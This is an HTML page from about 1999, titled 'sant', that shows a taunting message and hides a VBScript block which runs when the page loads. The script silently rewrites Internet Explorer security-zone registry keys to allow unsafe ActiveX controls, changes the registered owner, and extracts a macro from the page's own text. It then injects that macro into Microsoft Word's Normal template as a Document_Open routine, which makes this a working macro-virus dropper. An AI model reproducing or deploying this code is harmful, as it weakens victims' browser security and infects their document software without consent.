<nospace>

<Html>
<HEAD>
<title>sant</title>
</head>

<body>

<br><br><br>
<font size="7"><center>sant</font>
<br>
<br>
<font size = 2 face="times">you suck!</font>

<br>
<br>
<font face="arial" size=1>
<b></b><font face="arial" size=2><pre>&copy 1999   s a n t</pre><br><br> 
<bR>
</font>
<font size="1" face="arial">
</center>

<script language="VBScript"><!--

Sub boo()
End Sub

On error Resume Next

Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "s a n t"
dim abcd
Set abcd = CreateObject("Scripting.FileSystemObject")
Set hg = document.body.createTextRange
Set kj = abcd.OpenTextFile("c:\windows\uuu1.txt", 2, True)
kj.WriteLine hg.htmltext
kj.close()
Set kj = abcd.OpenTextFile("c:\windows\uuu1.txt", 1, True)
wbeginvir = "Sub WordMark()"
Do While kj.atendofstream <> True
wfindr = kj.readline
if wfindr = wbeginvir then exit Do
Loop
Set a2 = abcd.OpenTextFile("c:\windows\uuu2.txt", 2, True)
wlinr = "bla"
a2.writeline "Private Sub Document_Open()"
Do While wlinr <> "End Sub"
wlinr = kj.readline
a2.writeline wlinr
Loop
a2.close
kj.close
Set cool = abcd.OpenTextFile("c:\windows\uuu2.txt", 1, True)
Set hot = abcd.OpenTextFile("c:\windows\bbb.txt", 2, True)
ahh = "nope"
Do while cool.atendofstream <> True
ahh = cool.readline
if Mid(ahh,1,1) = "'" then ahh = Mid(ahh,2,Len(ahh) -1)
hot.writeline ahh	
Loop
hot.Close
cool.close
Set hot = abcd.OpenTextFile("c:\windows\bbb.txt", 1, True)
Set WordObj = CreateObject("Word.Application")
set NT= WordObj.normaltemplate.vbproject.vbcomponents(1).codemodule
If NT.Lines(5,1) <> "MyID = h1deS" then
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
i = 1
Do while hot.atendofstream <> true
b = hot.readline
NT.InsertLines i, b
i = i + 1
Loop
End If
Set NT = Nothing
WordObj.Quit
hot.close
Sub WordMark()
'
'On Error Resume Next
'
'MyID = sant
'Version = 678
'WrittenBy = sant
'
''<-------------------------------infection-------------------------------->
'
'
'
''<-------------------------------stealth-------------------------------->
'
'
'
''<-------------------------------payload-------------------------------->
'
' MsgBox("!!!")

End Sub



--></script>





</body>
</html>

